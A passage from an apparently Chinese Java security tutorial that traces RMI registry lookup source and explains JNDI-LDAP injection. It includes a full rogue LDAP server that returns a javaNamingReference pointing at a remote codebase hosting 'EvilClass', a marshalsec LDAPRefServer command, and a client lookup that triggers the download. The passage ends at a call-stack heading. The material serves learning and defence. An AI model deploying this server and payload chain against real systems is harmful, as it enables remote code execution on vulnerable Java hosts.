<p>如果我们在注册中心注册远程对象的时候是直接使用 <code>LocateRegistry.createRegistry(1099).bind</code> 注册，那么注册中心会直接把我们要注册的远程对象放进 <code>bindings</code> 中。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">(String name, Remote obj)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException, AlreadyBoundException, AccessException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 说明：对“远程来电”路径，骨架/调度层会先做访问控制校验；</span></span><br><span class="line">    <span class="comment">//       本地同进程直接调用不经过骨架的远程访问检查。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (bindings) &#123;                <span class="comment">// 以注册表映射为锁，保证并发安全</span></span><br><span class="line">        <span class="comment">// 1) 检查名称是否已被占用</span></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">curr</span> <span class="operator">=</span> bindings.get(name);</span><br><span class="line">        <span class="keyword">if</span> (curr != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 已存在同名条目 → 按规范抛 AlreadyBoundException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AlreadyBoundException</span>(name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 放入映射：名称 → 远程对象（通常是其 stub）</span></span><br><span class="line">        bindings.put(name, obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后客户端 <code>RegistryImpl_Stub#lookup</code> 查询远程对象的时候，注册中心会调用到 <code>RegistryImpl_Skel#dispatch</code> 的 <code>lookup</code> 分支。这里会将本地调用 <code>RegistryImpl#lookup</code> 根据字符串 <code>name</code> 查询到的对象序列化发回。<strong>期间没有任何过滤检查。</strong></p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">2</span>: <span class="comment">// lookup(String)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ---- 1) 解组（读取）入参：String name ----</span></span><br><span class="line">    java.lang.String $param_String_1;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// RMI 传输层提供的输入流（通常是 MarshalInputStream 的子类），</span></span><br><span class="line">        <span class="comment">// 这里按需向下转型为 ObjectInputStream 使用。</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> (ObjectInputStream) call.getInputStream();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 使用 JDK 内部的 SharedSecrets 直读字符串：</span></span><br><span class="line">        <span class="comment">// 与通用的 in.readObject() 不同，readString(...) 只接收 TC_STRING/TC_LONGSTRING，</span></span><br><span class="line">        <span class="comment">// 避免触发任意对象反序列化（更高效、也更安全）。</span></span><br><span class="line">        $param_String_1 =</span><br><span class="line">            SharedSecrets.getJavaObjectInputStreamReadString().readString(in);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassCastException | IOException e) &#123;</span><br><span class="line">        <span class="comment">// 入参解组失败：丢弃还未处理完的引用（避免 DGC/引用泄漏），并按协议抛出“解组异常”</span></span><br><span class="line">        call.discardPendingRefs();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="comment">// 无论成功失败，都要释放输入流占用的底层资源/连接一侧</span></span><br><span class="line">        call.releaseInputStream();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---- 2) 本地调用实现：RegistryImpl.lookup(name) ----</span></span><br><span class="line">    java.rmi.<span class="type">Remote</span> <span class="variable">$result</span> <span class="operator">=</span> server.lookup($param_String_1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ---- 3) 组包并写回返回值（正常返回）----</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// true 表示“正常返回”（非异常路径）；RMI 会据此写入相应的返回头部</span></span><br><span class="line">        java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 返回值是 Remote：RMI 会在写出时将其“替换”为可传输的 stub/动态代理，</span></span><br><span class="line">        <span class="comment">// 客户端收到的是远程引用而非服务端实现对象本身</span></span><br><span class="line">        out.writeObject($result);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">        <span class="comment">// 返回值序列化失败 → 按协议抛出“编组异常”</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling return&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p> <code>RegistryImpl#lookup</code> 直接根据 <code>name</code> 参数从 <code>bindings</code> 中查询对应的对象返回。因此这里序列化返回的是我们注册到注册中心的序列化对象。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>正常情况下我们在注册中心注册的普通远程对象应当是对象本身的一个动态代理，这是因为我们在定义远程对象的时候会使用 <code>exportObject</code> 导出。但是这里我们是直接将一个反序列化对象注册到了注册中心，因此客户端 <code>lookup</code> 查询到的就是我们注册的反序列化对象。</p>

    </div>
  </div>

<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Remote <span class="title function_">lookup</span><span class="params">(String name)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException, NotBoundException</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">synchronized</span> (bindings) &#123;             <span class="comment">// 保证“检查并返回”的一致性与可见性</span></span><br><span class="line">        <span class="type">Remote</span> <span class="variable">obj</span> <span class="operator">=</span> bindings.get(name);  <span class="comment">// 根据名称查询已登记的远程对象</span></span><br><span class="line">        <span class="keyword">if</span> (obj == <span class="literal">null</span>) &#123;                <span class="comment">// 未绑定：按规范抛出 NotBoundException</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NotBoundException</span>(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;                       <span class="comment">// 命中：返回远程对象引用（通常为 stub）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="JNDI-LDAP"><a href="#JNDI-LDAP" class="headerlink" title="JNDI-LDAP"></a>JNDI-LDAP</h3><p><strong>LDAP（Lightweight Directory Access Protocol）</strong> 是一种访问“目录服务”的网络协议，也就是“专门用来查找信息的大号电话簿服务器”。它不存文件、不跑网站，只做一件事：<strong>像个高性能、只读为主的树状数据库，供你快速“查人、查设备、查对象信息”。</strong></p>
<p>LDAP 内部维护一个<strong>目录信息树（Directory Information Tree）</strong>，整个目录就是一棵<strong>倒挂的树</strong>，每个<strong>条目  Entry</strong> 是一片“叶&#x2F;节点”。例如：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dc=example,dc=com            ← 根节点（命名上下文 / 后缀）</span><br><span class="line">├── ou=people                ← 一个组织单位（组织结构）</span><br><span class="line">│   ├── uid=alice            ← Alice 用户</span><br><span class="line">│   └── uid=bob              ← Bob 用户</span><br><span class="line">├── ou=groups                ← 一组用户组</span><br><span class="line">│   └── cn=adminGroup        ← 管理员组</span><br><span class="line">└── ou=devices               ← 一组设备</span><br><span class="line">    └── cn=printer01</span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>整棵树是<strong>分层有序</strong>的结构（像文件系统，但主要用于<strong>查而非存</strong>），树的根（后缀、命名上下文）常见是域名拆分：<code>dc=example,dc=com</code>。</p>
</li>
<li><p>每个条目（Entry）都有：</p>
</li>
<li><p><strong>DN（Distinguished Name）</strong> ：它的“完整地址路径”，例如：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=alice,ou=people,dc=example,dc=com</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong>属性（Attributes）</strong> ：以键值对形式保存的信息，例如前面 DN 的例子对应的属性可以是：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cn=Alice Smith</span><br><span class="line">sn=Smith</span><br><span class="line">mail=alice@example.com</span><br><span class="line">objectClass=inetOrgPerson</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h4 id="远程类加载（11-0-1、8u191、7u201、6u211-前）"><a href="#远程类加载（11-0-1、8u191、7u201、6u211-前）" class="headerlink" title="远程类加载（11.0.1、8u191、7u201、6u211 前）"></a>远程类加载（11.0.1、8u191、7u201、6u211 前）</h4><p>如果在自建的 LDAP 服务器在返回的条目里塞了<strong>Java 扩展属性</strong> ：</p>
<ul>
<li><code>objectClass: javaNamingReference</code></li>
<li><code>javaFactory: EvilClass</code></li>
<li><code>javaCodeBase: http://localhost:8000/</code></li>
</ul>
<p>Java 的 <strong>JNDI-LDAP 提供者</strong>看到这些，会按 <strong>“Reference 分支”</strong> 去“<strong>还原对象</strong>”：</p>
<ol>
<li><p>本地能找到 <code>EvilClass</code> 工厂类 → 直接执行</p>
</li>
<li><p>找不到且 <strong>允许远程 codebase</strong> → 去 <code>javaCodeBase</code> 下载类并执行</p>
</li>
</ol>
<p>LDAP 在这里就是<strong>运输载体</strong> ：把一条“带特殊属性的条目”送给 JNDI，JNDI 再按规则把它当作 Java 对象处理。因此这里本质上还是通过 JNDI 的 References 机制来远程加载类。</p>
<p>为了完成 JNDI+LDAP 的攻击，我们需要搭建一个简易的 LDAP 服务器。</p>
<p><code>com.unboundid.*</code> 是 <a class="link"   target="_blank" rel="noopener" href="https://www.ldap.com/unboundid-ldap-sdk-for-java?utm_source=chatgpt.com" >UnboundID LDAP SDK<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>：<strong>一个纯 Java 实现的 LDAP 客户端 + 服务器库</strong>，由原 Sun Directory Server 团队开发，<strong>支持嵌入式 LDAP 服务器</strong>。</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.unboundid<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>借助 <code>com.unboundid</code> 我们可以开发一个简易的 LDAP 服务器来响应客户端的 LDAP 请求并返回固定结果：</p>
<ol>
<li><p>用 <code>InMemoryDirectoryServer</code> 起了一个轻量 LDAP 服务（监听 <code>0.0.0.0:1389</code>）</p>
</li>
<li><p>用 <code>InMemoryOperationInterceptor</code> 拦截所有 <code>search</code> 请求</p>
</li>
<li><p>不管客户端查啥 DN，统一返回一条“假的 LDAP 条目”，内容如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dn: dc=example,dc=com</span><br><span class="line">objectClass: javaNamingReference</span><br><span class="line">javaFactory: EvilClass</span><br><span class="line">javaCodeBase: http://localhost:8000/</span><br></pre></td></tr></table></figure></div></li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.*;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.*;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * JNDI-LDAP 引用服务器</span></span><br><span class="line"><span class="comment"> * - 使用 UnboundID 内存型 LDAP 服务器</span></span><br><span class="line"><span class="comment"> * - 拦截任意 search 请求，直接返回一个“Java Reference”条目</span></span><br><span class="line"><span class="comment"> * - 条目里放：javaNamingReference / javaFactory / javaCodeBase</span></span><br><span class="line"><span class="comment"> *   → 由客户端 JNDI-LDAP 提供者解析，尝试按 codebase 加载工厂类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * - 远程 codebase 是否允许，取决于客户端 JVM 的</span></span><br><span class="line"><span class="comment"> *   com.sun.jndi.ldap.object.trustURLCodebase（8u191/11+ 默认 false）</span></span><br><span class="line"><span class="comment"> * - 这里固定回一个 DN=BASE 的条目，忽略了请求的 baseDN</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPServer</span> &#123;</span><br><span class="line">    <span class="comment">// 目录根 DN（条目的“住址”根），客户端最好以此为 baseDN 查询</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="comment">// 工厂类下载根 URL（务必以 / 结尾；能直接访问到 EvilClass.class）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CODEBASE</span> <span class="operator">=</span> <span class="string">&quot;http://localhost:8000/&quot;</span>;</span><br><span class="line">    <span class="comment">// 工厂类简单名（无包名时=文件名；若有包名需改成完全限定名并调整 codebase 目录结构）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FACTORY</span> <span class="operator">=</span> <span class="string">&quot;EvilClass&quot;</span>;</span><br><span class="line">    <span class="comment">// 演示端口（标准 LDAP 明文是 389，PoC 常用不冲突的 1389）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1) 以 BASE 为根创建内存 LDAP 配置</span></span><br><span class="line">        <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">cfg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(BASE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2) 启用 IPv4 监听</span></span><br><span class="line">        cfg.setListenerConfigs(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                        <span class="string">&quot;v4&quot;</span>,                                <span class="comment">// 监听器名字</span></span><br><span class="line">                        InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),    <span class="comment">// 监听地址（IPv4 全接口）</span></span><br><span class="line">                        PORT,                                 <span class="comment">// 监听端口</span></span><br><span class="line">                        ServerSocketFactory.getDefault(),     <span class="comment">// 明文 server socket 工厂</span></span><br><span class="line">                        SocketFactory.getDefault(),           <span class="comment">// client socket 工厂（一般用不到）</span></span><br><span class="line">                        (SSLSocketFactory) SSLSocketFactory.getDefault() <span class="comment">// 可用于 StartTLS/LDAPS，这里未启用</span></span><br><span class="line">                )</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3) 注册拦截器：拦截 search 并直接回一个 Reference 条目</span></span><br><span class="line">        cfg.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">RefInterceptor</span>(CODEBASE, FACTORY));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4) 启动内存服务器</span></span><br><span class="line">        <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(cfg);</span><br><span class="line">        System.out.println(<span class="string">&quot;[*] LDAP listening on 0.0.0.0:&quot;</span> + PORT);</span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 搜索结果拦截器：</span></span><br><span class="line"><span class="comment">     * - 不管客户端查什么 DN，一律返回一个固定 DN=BASE 的条目</span></span><br><span class="line"><span class="comment">     * - 条目属性设置为“Java 引用对象”编码（javaNamingReference 分支）</span></span><br><span class="line"><span class="comment">     *   * objectClass: javaNamingReference</span></span><br><span class="line"><span class="comment">     *   * javaClassName: 提示类名（非强约束；Many impl 不严）</span></span><br><span class="line"><span class="comment">     *   * javaFactory:   工厂类名（JNDI 将实例化它）</span></span><br><span class="line"><span class="comment">     *   * javaCodeBase:  工厂类下载根 URL（末尾带 /）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">RefInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> Entry entry;</span><br><span class="line"></span><br><span class="line">        RefInterceptor(String codebase, String factory) &#123;</span><br><span class="line">            <span class="comment">// 固定使用 BASE 作为返回条目的 DN（简单粗暴；真实服务器通常回请求里的 DN）</span></span><br><span class="line">            <span class="built_in">this</span>.entry = <span class="keyword">new</span> <span class="title class_">Entry</span>(BASE);</span><br><span class="line">            entry.addAttribute(<span class="string">&quot;objectClass&quot;</span>, <span class="string">&quot;javaNamingReference&quot;</span>);</span><br><span class="line">            entry.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;java.lang.Object&quot;</span>); <span class="comment">// 仅作提示，可随意</span></span><br><span class="line">            entry.addAttribute(<span class="string">&quot;javaFactory&quot;</span>, factory);              <span class="comment">// 需与远程加载类名称匹配</span></span><br><span class="line">            entry.addAttribute(<span class="string">&quot;javaCodeBase&quot;</span>, codebase);            <span class="comment">// 需能直达 .class 的根 URL；结尾必须有 &#x27;/&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span><span class="params">(InMemoryInterceptedSearchResult result)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 直接把预构建条目作为搜索结果返回，忽略请求的 baseDN / scope</span></span><br><span class="line">                result.sendSearchEntry(entry);</span><br><span class="line">                result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>除了自己实现 LDAP 服务器外，我们还可以借助 <a class="link"   target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec" >marshalsec<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 来开启一个 LDAP 服务。</p>
<ol>
<li><p>首先运行 <code>mvn clean package -DskipTests</code> 将项目打包为 jar 包，项目会多出一个 target 目录，进入可以看到生成的 jar 包。</p>
</li>
<li><p>开启ldap服务：</p>
<div class="code-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp .\marshalsec-<span class="number">0</span>.<span class="number">0</span>.<span class="number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">8000</span>/#EvilClass <span class="number">1389</span></span><br></pre></td></tr></table></figure></div></li>
</ol>

    </div>
  </div>

<p>这样客户端的通过 JNDI 访问 <code>ldap://localhost:1389/exploit</code>（后面的字符串 <code>exploit</code> 可以任意指定）时会得到我们的恶意 JNDI 服务器的固定返回结果。</p>
<ol>
<li><p>从 HTTP 上下载 <code>EvilClass.class</code></p>
</li>
<li><p>实例化它（它实现了 <code>ObjectFactory</code>）</p>
</li>
<li><p>触发恶意代码（比如弹计算器）</p>
</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ctx.lookup(<span class="string">&quot;ldap://localhost:1389/exploit&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<pre class="mermaid">sequenceDiagram
    autonumber

    %% ── 客户端（本机进程） ──
    box rgb(230,242,255) 客户端（进程）
      participant App as Client 应用 💻
      participant IC as InitialContext
      participant LURL as ldapURLContext
      participant LCtx as LdapCtx
      participant OBJ as Obj.decodeObject 解码器
      participant DM as DirectoryManager 🧠
      participant NM as NamingManager
      participant VH as VersionHelper / URLClassLoader 📚
    end

    %% ── 目录服务（远端） ──
    box rgb(232,245,233) LDAP 服务器
      participant LDAP as InMemoryDirectoryServer / LDAP
    end

    %% ── 代码库（远端） ──
    box rgb(255,243,224) 代码库服务器
      participant HTTP as HTTP Codebase 🌐
    end

    %% 1) JNDI 访问 LDAP
    App->>IC: lookup(ldap://localhost:1389/exploit) 🔍
    IC->>LURL: 选择 LDAP 提供者
    LURL->>LCtx: c_lookup(Name)

    %% 2) LDAP 返回“Java 扩展属性”条目
    LCtx->>LDAP: search base=exploit scope=OBJECT filter=(objectClass=*)
    LDAP-->>LCtx: 返回条目：javaNamingReference / javaFactory=EvilClass / javaCodeBase=http://localhost:8000/ 📄

    %% 3) 解码为 Reference
    LCtx->>OBJ: decodeObject(attrs)
    OBJ-->>LCtx: Reference(factory=EvilClass, codebase=http://localhost:8000/) 🗂️

    %% 4) 进入对象工厂分支（DirectoryManager → NamingManager）
    LCtx->>DM: getObjectInstance(ref, name, ctx, env, attrs)
    DM->>NM: getObjectFactoryFromReference(ref, EvilClass)

    %% 5) 远程 codebase 加载分支（体现 8u191 修复）
    note over NM,VH: 读取 com.sun.jndi.ldap.object.trustURLCodebase（8u191+ 默认 false）🔧
    alt 允许远程 codebase（8u191 之前 或 -D...=true）🔓
      NM->>VH: loadClass(EvilClass, http://localhost:8000/) 📥
      VH->>HTTP: GET /EvilClass.class 🌐
      HTTP-->>VH: 200 OK（class 字节）📦
      VH-->>NM: Class EvilClass
      note right of NM: 💥 类加载触发 clinit 静态初始化（如 Runtime.exec）
      NM-->>DM: （可继续实例化并进入工厂逻辑）返回
      DM-->>App: 返回结果 ✅
    else 禁止远程 codebase（8u191+ 未开启）🔒
      NM->>VH: loadClass(EvilClass, http://localhost:8000/)
      VH-->>NM: 拒绝远程加载（null/失败）
      NM-->>DM: 回退路径：尝试本地 classpath 或按规范返回 refInfo
      DM-->>App: 回退结果 ⚠️
    end</pre>

<p>调用堆栈如下：</p>
